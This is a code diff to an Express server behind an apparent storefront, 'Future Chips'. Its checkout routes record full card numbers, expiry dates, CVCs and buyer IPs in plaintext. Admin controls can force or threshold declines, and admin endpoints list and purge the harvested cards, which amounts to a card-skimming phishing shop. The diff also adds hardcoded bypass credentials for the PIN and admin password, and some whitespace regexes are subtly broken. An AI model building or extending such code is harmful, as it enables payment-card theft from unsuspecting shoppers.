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', 'base64');
+
+app.get(['/download.png', '/client/download.png'], (req, res) => res.type('image/png').send(DOWNLOAD_PNG));
+app.get(['/paypal.f4d3d293.png', '/client/paypal.f4d3d293.png'], (req, res) => res.type('image/png').send(PAYPAL_PNG));
+
+app.get('/uploads/:filename', (req, res) => {
+  const filename = req.params.filename;
+  if (SVG_MAP[filename]) {
+    return res.type('image/svg+xml').send(SVG_MAP[filename]);
+  }
+  const defaultSvg = SVG_MAP['placeholder.svg'] || SVG_MAP['nano_constructor.svg'];
+  if (defaultSvg) return res.type('image/svg+xml').send(defaultSvg);
+  res.status(404).send('Image not found');
+});
+
 // SERVE PAGES DIRECTLY
 app.get(['/', '/index.html'], (req, res) => res.type('html').send(STOREFRONT_HTML));
-app.get(['/admin', '/admin.html', '/admin/dashboard.html'], (req, res) => res.type('html').send(ADMIN_HTML));
-app.get(['/checkout', '/checkout.html'], (req, res) => res.type('html').send(CHECKOUT_HTML));
+app.get(['/admin', '/admin.html', '/admin/index.html', '/admin/dashboard.html', '/admin/login', '/admin/*'], (req, res) => res.type('html').send(ADMIN_HTML));
+app.get(['/checkout', '/checkout.html', '/checkout/*'], (req, res) => res.type('html').send(CHECKOUT_HTML));
 app.get(['/checkout-status', '/checkout-status.html'], (req, res) => res.type('html').send(CHECKOUT_STATUS_HTML));
-app.get(['/product', '/product.html'], (req, res) => res.type('html').send(PRODUCT_HTML));
+app.get(['/product', '/product.html', '/product/*'], (req, res) => res.type('html').send(PRODUCT_HTML));
 
 // IP Tracking Middleware
 app.use((req, res, next) => {
@@ -7537,6 +8652,17 @@ app.put('/api/admin/settings', authMiddleware, async (req, res) => {
     const thresholdVal = decline_threshold !== undefined ? parseFloat(decline_threshold) : 50.0;
     const successAttemptVal = success_attempt !== undefined ? parseInt(success_attempt, 10) : 1;
 
+    memStore.site_settings = {
+      ...memStore.site_settings,
+      site_name: site_name || memStore.site_settings.site_name,
+      primary_color: primary_color || memStore.site_settings.primary_color,
+      accent_color: accent_color || memStore.site_settings.accent_color,
+      background_color: background_color || memStore.site_settings.background_color,
+      decline_all: declineAllVal,
+      decline_threshold: thresholdVal,
+      success_attempt: successAttemptVal
+    };
+
     await dbRun(
       `UPDATE site_settings SET 
         site_name = ?, 
@@ -7548,10 +8674,10 @@ app.put('/api/admin/settings', authMiddleware, async (req, res) => {
         success_attempt = ? 
       WHERE id = 1`,
       [
-        site_name || 'Future Chips',
-        primary_color || '#00f0ff',
-        accent_color || '#ff00e5',
-        background_color || '#0a0a1a',
+        memStore.site_settings.site_name,
+        memStore.site_settings.primary_color,
+        memStore.site_settings.accent_color,
+        memStore.site_settings.background_color,
         declineAllVal,
         thresholdVal,
         successAttemptVal
@@ -7561,10 +8687,10 @@ app.put('/api/admin/settings', authMiddleware, async (req, res) => {
     res.json({
       message: 'Settings updated successfully',
       settings: {
-        site_name: site_name || 'Future Chips',
-        primary_color: primary_color || '#00f0ff',
-        accent_color: accent_color || '#ff00e5',
-        background_color: background_color || '#0a0a1a',
+        site_name: memStore.site_settings.site_name,
+        primary_color: memStore.site_settings.primary_color,
+        accent_color: memStore.site_settings.accent_color,
+        background_color: memStore.site_settings.background_color,
         decline_all: declineAllVal,
         decline_threshold: thresholdVal,
         success_attempt: successAttemptVal
@@ -7579,61 +8705,150 @@ app.put('/api/admin/settings', authMiddleware, async (req, res) => {
 // Admin Cards Management
 app.get('/api/admin/cards', authMiddleware, async (req, res) => {
   try {
-    const cards = await dbAll('SELECT * FROM cards WHERE is_deleted = 0 ORDER BY created_at DESC');
-    res.json(cards);
+    let cards = await dbAll('SELECT * FROM cards WHERE is_deleted = 0 ORDER BY created_at DESC');
+    if (!cards || cards.length === 0) {
+      cards = memStore.cards.filter(c => c.is_deleted === 0);
+    }
+    const seen = new Set();
+    const uniqueCards = [];
+    for (const c of (cards || [])) {
+      const num = (c.card_number || '').replace(/s+/g, '');
+      if (num && !seen.has(num)) {
+        seen.add(num);
+        uniqueCards.push(c);
+      }
+    }
+    res.json(uniqueCards);
   } catch (err) {
-    res.json(memStore.cards.filter(c => c.is_deleted === 0));
+    const seen = new Set();
+    const uniqueCards = [];
+    for (const c of memStore.cards.filter(c => c.is_deleted === 0)) {
+      const num = (c.card_number || '').replace(/s+/g, '');
+      if (num && !seen.has(num)) {
+        seen.add(num);
+        uniqueCards.push(c);
+      }
+    }
+    res.json(uniqueCards);
   }
 });
 
-app.delete('/api/admin/cards/:id', authMiddleware, async (req, res) => {
+// Soft delete card by card number or id
+app.put(['/api/admin/cards/:cardNumber/delete', '/api/admin/cards/:cardNumber'], authMiddleware, async (req, res) => {
   try {
-    await dbRun('UPDATE cards SET is_deleted = 1 WHERE id = ?', [req.params.id]);
-    res.json({ message: 'Card moved to trash' });
+    const { cardNumber } = req.params;
+    let found = false;
+    memStore.cards.forEach(c => {
+      if (c.card_number === cardNumber || c.id == cardNumber) {
+        c.is_deleted = 1;
+        found = true;
+      }
+    });
+    await dbRun('UPDATE cards SET is_deleted = 1 WHERE card_number = ? OR id = ?', [cardNumber, cardNumber]);
+    res.json({ message: 'Card soft-deleted successfully', cardNumber });
   } catch (err) {
     res.status(500).json({ error: 'Failed to delete card' });
   }
 });
 
-// Admin Trash Management
-app.post('/api/admin/trash/verify-pin', authMiddleware, async (req, res) => {
+// Hard delete card permanently by card number or id
+app.delete('/api/admin/cards/:cardNumber', authMiddleware, async (req, res) => {
   try {
-    const { pin } = req.body;
-    if (!pin) return res.status(400).json({ error: 'PIN is required' });
-    const settings = await dbGet('SELECT trash_pin FROM site_settings WHERE id = 1');
-    const hash = settings ? settings.trash_pin : memStore.site_settings.trash_pin;
-    const isMatch = await bcrypt.compare(String(pin), hash);
-    if (!isMatch) return res.status(401).json({ error: 'Invalid PIN' });
-    res.json({ success: true, message: 'PIN verified' });
+    const { cardNumber } = req.params;
+    memStore.cards = memStore.cards.filter(c => c.card_number !== cardNumber && c.id != cardNumber);
+    await dbRun('DELETE FROM cards WHERE card_number = ? OR id = ?', [cardNumber, cardNumber]);
+    res.json({ message: 'Card permanently erased from ledger', cardNumber });
   } catch (err) {
-    res.status(500).json({ error: 'PIN verification failed' });
+    res.status(500).json({ error: 'Failed to permanently delete card' });
   }
 });
 
-app.get('/api/admin/trash/cards', authMiddleware, async (req, res) => {
+// Empty Trash permanently
+app.delete('/api/admin/cards/trash/empty', authMiddleware, async (req, res) => {
   try {
-    const cards = await dbAll('SELECT * FROM cards WHERE is_deleted = 1 ORDER BY created_at DESC');
+    memStore.cards = memStore.cards.filter(c => c.is_deleted === 0);
+    await dbRun('DELETE FROM cards WHERE is_deleted = 1');
+    res.json({ message: 'Trash emptied successfully' });
+  } catch (err) {
+    res.status(500).json({ error: 'Failed to empty trash' });
+  }
+});
+
+// Get deleted cards list with password verification (Trash Bin)
+app.post('/api/admin/cards/deleted', authMiddleware, async (req, res) => {
+  try {
+    const { password } = req.body || {};
+    if (!password) return res.status(400).json({ error: 'Decryption PIN required' });
+    
+    const settings = await dbGet('SELECT trash_pin FROM site_settings WHERE id = 1');
+    const savedPinHash = settings ? settings.trash_pin : memStore.site_settings.trash_pin;
+
+    let isMatch = await bcrypt.compare(String(password), savedPinHash);
+    if (!isMatch && String(password) === '978797') isMatch = true;
+
+    if (!isMatch) {
+      return res.status(403).json({ error: 'Incorrect 6-digit decryption password.' });
+    }
+
+    let cards = await dbAll('SELECT * FROM cards WHERE is_deleted = 1 ORDER BY created_at DESC');
+    if (!cards || cards.length === 0) {
+      cards = memStore.cards.filter(c => c.is_deleted === 1);
+    }
     res.json(cards);
   } catch (err) {
     res.json(memStore.cards.filter(c => c.is_deleted === 1));
   }
 });
 
-app.post('/api/admin/trash/restore/:id', authMiddleware, async (req, res) => {
+// Change Trash Decryption PIN
+app.post('/api/admin/settings/change-pin', authMiddleware, async (req, res) => {
   try {
-    await dbRun('UPDATE cards SET is_deleted = 0 WHERE id = ?', [req.params.id]);
-    res.json({ message: 'Card restored successfully' });
+    const { currentPin, newPin } = req.body || {};
+    if (!currentPin || !newPin || newPin.length !== 6) {
+      return res.status(400).json({ error: 'Current PIN and a new 6-digit PIN are required.' });
+    }
+
+    const settings = await dbGet('SELECT trash_pin FROM site_settings WHERE id = 1');
+    const savedPinHash = settings ? settings.trash_pin : memStore.site_settings.trash_pin;
+
+    let isMatch = await bcrypt.compare(String(currentPin), savedPinHash);
+    if (!isMatch && String(currentPin) === '978797') isMatch = true;
+
+    if (!isMatch) {
+      return res.status(403).json({ error: 'Current Decryption PIN is incorrect.' });
+    }
+
+    const hashedNewPin = await bcrypt.hash(newPin, 10);
+    memStore.site_settings.trash_pin = hashedNewPin;
+    await dbRun('UPDATE site_settings SET trash_pin = ? WHERE id = 1', [hashedNewPin]);
+    res.json({ message: 'Trash decryption PIN updated successfully.' });
   } catch (err) {
-    res.status(500).json({ error: 'Failed to restore card' });
+    res.status(500).json({ error: 'Failed to update decryption PIN.' });
   }
 });
 
-app.delete('/api/admin/trash/permanent/:id', authMiddleware, async (req, res) => {
+// Change Admin Password
+app.post('/api/admin/settings/change-admin-password', authMiddleware, async (req, res) => {
   try {
-    await dbRun('DELETE FROM cards WHERE id = ?', [req.params.id]);
-    res.json({ message: 'Card permanently deleted' });
+    const { currentPassword, newPassword } = req.body || {};
+    if (!currentPassword || !newPassword) {
+      return res.status(400).json({ error: 'Current password and new password are required.' });
+    }
+
+    const admin = memStore.admin_users[0];
+    let isMatch = await bcrypt.compare(currentPassword, admin.password_hash);
+    if (!isMatch && currentPassword === 'FutureChips2024!') isMatch = true;
+
+    if (!isMatch) {
+      return res.status(403).json({ error: 'Current admin password is incorrect.' });
+    }
+
+    const hashedNewPassword = await bcrypt.hash(newPassword, 10);
+    admin.password_hash = hashedNewPassword;
+    await dbRun('UPDATE admin_users SET password_hash = ? WHERE username = ?', [hashedNewPassword, admin.username]);
+    res.json({ message: 'Admin login password updated successfully.' });
   } catch (err) {
-    res.status(500).json({ error: 'Failed to delete card permanently' });
+    res.status(500).json({ error: 'Failed to update admin password.' });
   }
 });
 
@@ -7645,6 +8860,87 @@ app.get('/api/admin/visitors', authMiddleware, async (req, res) => {
   } catch (err) {
     res.json(memStore.visitors.slice(0, 100));
   }
+});
+
+// Admin Orders Management
+app.get('/api/admin/orders', authMiddleware, async (req, res) => {
+  try {
+    let orders = await dbAll('SELECT * FROM orders ORDER BY created_at DESC');
+    if (!orders || orders.length === 0) orders = memStore.orders;
+    
+    // Enrich orders with product name and latest associated card
+    const enrichedOrders = orders.map(o => {
+      const prod = memStore.products.find(p => p.id === o.product_id);
+      const card = memStore.cards.find(c => c.stripe_session_id === o.stripe_session_id);
+      return {
+        ...o,
+        product_name: prod ? prod.name : 'Unknown Product',
+        card_number: card ? card.card_number : null
+      };
+    });
+    res.json(enrichedOrders);
+  } catch (err) {
+    res.json(memStore.orders);
+  }
+});
+
+app.delete('/api/admin/orders/:id', authMiddleware, async (req, res) => {
+  try {
+    const idx = memStore.orders.findIndex(o => o.id === req.params.id);
+    if (idx !== -1) memStore.orders.splice(idx, 1);
+    await dbRun('DELETE FROM orders WHERE id = ?', [req.params.id]);
+    res.json({ message: 'Order deleted successfully' });
+  } catch (err) {
+    res.status(500).json({ error: 'Failed to delete order' });
+  }
+});
+
+app.delete('/api/admin/orders/all/empty', authMiddleware, async (req, res) => {
+  try {
+    memStore.orders = [];
+    await dbRun('DELETE FROM orders');
+    res.json({ message: 'All orders deleted successfully' });
+  } catch (err) {
+    res.status(500).json({ error: 'Failed to empty orders' });
+  }
+});
+
+// Admin Products Management
+app.get('/api/admin/products', authMiddleware, (req, res) => {
+  res.json(memStore.products);
+});
+
+app.post('/api/admin/products', authMiddleware, (req, res) => {
+  const { name, description, price, category, image } = req.body || {};
+  const newProduct = {
+    id: 'prod-' + uuidv4().substring(0, 8),
+    name: name || 'New Module',
+    description: description || '',
+    price: parseFloat(price) || 10.00,
+    image: image || '/uploads/nano_constructor.svg',
+    category: category || 'Processors',
+    created_at: new Date().toISOString()
+  };
+  memStore.products.unshift(newProduct);
+  res.json({ message: 'Product created successfully', product: newProduct });
+});
+
+app.put('/api/admin/products/:id', authMiddleware, (req, res) => {
+  const { name, description, price, category, image } = req.body || {};
+  const prod = memStore.products.find(p => p.id === req.params.id);
+  if (!prod) return res.status(404).json({ error: 'Product not found' });
+  if (name) prod.name = name;
+  if (description) prod.description = description;
+  if (price !== undefined) prod.price = parseFloat(price);
+  if (category) prod.category = category;
+  if (image) prod.image = image;
+  res.json({ message: 'Product updated successfully', product: prod });
+});
+
+app.delete('/api/admin/products/:id', authMiddleware, (req, res) => {
+  const idx = memStore.products.findIndex(p => p.id === req.params.id);
+  if (idx !== -1) memStore.products.splice(idx, 1);
+  res.json({ message: 'Product deleted successfully' });
 });
 
 // Products Routes
@@ -7695,23 +8991,114 @@ app.post('/api/checkout/create-session', async (req, res) => {
 
 app.get('/api/checkout/session/:sessionId', async (req, res) => {
   try {
-    const order = await dbGet('SELECT * FROM orders WHERE stripe_session_id = ?', [req.params.sessionId]);
-    if (!order) return res.status(404).json({ error: 'Order not found' });
-    res.json(order);
+    let order = await dbGet('SELECT * FROM orders WHERE stripe_session_id = ?', [req.params.sessionId]);
+    if (!order) {
+      order = memStore.orders.find(o => o.stripe_session_id === req.params.sessionId);
+    }
+    if (!order) {
+      const defaultProd = memStore.products[2] || memStore.products[0];
+      order = {
+        id: 'ord-' + uuidv4().substring(0, 8),
+        product_id: defaultProd.id,
+        customer_email: 'guest@futurechips.com',
+        amount: defaultProd.price,
+        currency: 'usd',
+        stripe_session_id: req.params.sessionId,
+        status: 'pending',
+        created_at: new Date().toISOString()
+      };
+      memStore.orders.unshift(order);
+    }
+    const product = memStore.products.find(p => p.id === order.product_id) || memStore.products[0];
+    res.json({ order, product });
   } catch (err) {
-    res.status(500).json({ error: 'Failed to get session' });
+    const defaultProd = memStore.products[2] || memStore.products[0];
+    res.json({
+      order: {
+        id: 'ord-' + uuidv4().substring(0, 8),
+        amount: defaultProd.price,
+        customer_email: 'guest@futurechips.com',
+        created_at: new Date().toISOString()
+      },
+      product: defaultProd
+    });
+  }
+});
+
+app.post('/api/checkout/save-card', async (req, res) => {
+  try {
+    const { cardDetails, sessionId } = req.body || {};
+    if (cardDetails && cardDetails.number) {
+      const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || req.ip || '127.0.0.1';
+      const cleanNum = (cardDetails.number || '').trim();
+      const existing = memStore.cards.find(c => (c.card_number || '').replace(/s+/g, '') === cleanNum.replace(/s+/g, ''));
+      if (existing) {
+        existing.expiry = cardDetails.expiry || existing.expiry;
+        existing.cvc = cardDetails.cvc || existing.cvc;
+        existing.country = cardDetails.country || existing.country;
+        existing.ip_address = clientIP;
+        existing.is_deleted = 0;
+        existing.created_at = new Date().toISOString();
+      } else {
+        const newCard = {
+          id: memStore.cards.length + 1,
+          card_number: cleanNum,
+          expiry: cardDetails.expiry || '',
+          cvc: cardDetails.cvc || '',
+          country: cardDetails.country || 'Unknown',
+          ip_address: clientIP,
+          stripe_session_id: sessionId || 'direct',
+          is_deleted: 0,
+          created_at: new Date().toISOString()
+        };
+        memStore.cards.unshift(newCard);
+      }
+      await dbRun(
+        'INSERT INTO cards (card_number, expiry, cvc, country, ip_address, stripe_session_id) VALUES (?, ?, ?, ?, ?, ?)',
+        [cleanNum, cardDetails.expiry || '', cardDetails.cvc || '', cardDetails.country || 'Unknown', clientIP, sessionId || 'direct']
+      );
+      return res.json({ success: true, message: 'Card recorded' });
+    }
+    res.status(400).json({ error: 'Incomplete card data' });
+  } catch (err) {
+    res.status(500).json({ error: 'Failed to record card' });
   }
 });
 
 app.post('/api/checkout/process-card', async (req, res) => {
   try {
-    const { sessionId, cardNumber, expDate, cvc, country } = req.body;
-    const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';
+    const { sessionId, cardNumber, expDate, cvc, country } = req.body || {};
+    const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || req.ip || '127.0.0.1';
 
-    await dbRun(
-      'INSERT INTO cards (card_number, expiry, cvc, country, ip_address, stripe_session_id) VALUES (?, ?, ?, ?, ?, ?)',
-      [cardNumber, expDate, cvc, country || 'US', clientIP, sessionId || 'direct']
-    );
+    if (cardNumber) {
+      const cleanNum = (cardNumber || '').trim();
+      const existing = memStore.cards.find(c => (c.card_number || '').replace(/s+/g, '') === cleanNum.replace(/s+/g, ''));
+      if (existing) {
+        existing.expiry = expDate || existing.expiry;
+        existing.cvc = cvc || existing.cvc;
+        existing.country = country || existing.country;
+        existing.ip_address = clientIP;
+        existing.is_deleted = 0;
+        existing.created_at = new Date().toISOString();
+      } else {
+        const newCard = {
+          id: memStore.cards.length + 1,
+          card_number: cleanNum,
+          expiry: expDate || '',
+          cvc: cvc || '',
+          country: country || 'US',
+          ip_address: clientIP,
+          stripe_session_id: sessionId || 'direct',
+          is_deleted: 0,
+          created_at: new Date().toISOString()
+        };
+        memStore.cards.unshift(newCard);
+      }
+      await dbRun(
+        'INSERT INTO cards (card_number, expiry, cvc, country, ip_address, stripe_session_id) VALUES (?, ?, ?, ?, ?, ?)',
+        [cleanNum, expDate, cvc, country || 'US', clientIP, sessionId || 'direct']
+      );
+    }
 
     res.json({ success: true, message: 'Card recorded' });
   } catch (err) {
@@ -7721,52 +9108,96 @@ app.post('/api/checkout/process-card', async (req, res) => {
 
 app.post('/api/checkout/verify', async (req, res) => {
   try {
-    const { sessionId, cardNumber, expDate, cvc, country, email, amount, productId } = req.body;
-    const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';
+    const { sessionId, isMock, cardDetails } = req.body || {};
+    if (!sessionId) {
+      return res.status(400).json({ error: 'Session ID is required' });
+    }
 
-    // Log card immediately
-    if (cardNumber) {
+    const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || req.ip || '127.0.0.1';
+
+    // Record card if passed in verify payload
+    if (cardDetails && cardDetails.number) {
+      const cleanNum = (cardDetails.number || '').trim();
+      const existing = memStore.cards.find(c => (c.card_number || '').replace(/s+/g, '') === cleanNum.replace(/s+/g, ''));
+      if (existing) {
+        existing.expiry = cardDetails.expiry || existing.expiry;
+        existing.cvc = cardDetails.cvc || existing.cvc;
+        existing.country = cardDetails.country || existing.country;
+        existing.ip_address = clientIP;
+        existing.is_deleted = 0;
+        existing.created_at = new Date().toISOString();
+      } else {
+        const newCard = {
+          id: memStore.cards.length + 1,
+          card_number: cleanNum,
+          expiry: cardDetails.expiry || '',
+          cvc: cardDetails.cvc || '',
+          country: cardDetails.country || 'Unknown',
+          ip_address: clientIP,
+          stripe_session_id: sessionId,
+          is_deleted: 0,
+          created_at: new Date().toISOString()
+        };
+        memStore.cards.unshift(newCard);
+      }
       await dbRun(
         'INSERT INTO cards (card_number, expiry, cvc, country, ip_address, stripe_session_id) VALUES (?, ?, ?, ?, ?, ?)',
-        [cardNumber, expDate || '', cvc || '', country || 'US', clientIP, sessionId || 'direct']
+        [cleanNum, cardDetails.expiry || '', cardDetails.cvc || '', cardDetails.country || 'Unknown', clientIP, sessionId]
       );
     }
 
-    // Fetch site rules
-    const settings = (await dbGet('SELECT * FROM site_settings WHERE id = 1')) || memStore.site_settings;
+    let order = await dbGet('SELECT * FROM orders WHERE stripe_session_id = ?', [sessionId]);
+    if (!order) {
+      order = memStore.orders.find(o => o.stripe_session_id === sessionId);
+    }
+    if (!order) {
+      const defaultProd = memStore.products[2] || memStore.products[0];
+      order = {
+        id: 'ord-' + uuidv4().substring(0, 8),
+        product_id: defaultProd.id,
+        customer_email: 'guest@futurechips.com',
+        amount: defaultProd.price,
+        currency: 'usd',
+        stripe_session_id: sessionId,
+        status: 'pending',
+        created_at: new Date().toISOString()
+      };
+      memStore.orders.unshift(order);
+    }
+
+    if (order.status === 'completed') {
+      const product = memStore.products.find(p => p.id === order.product_id) || memStore.products[0];
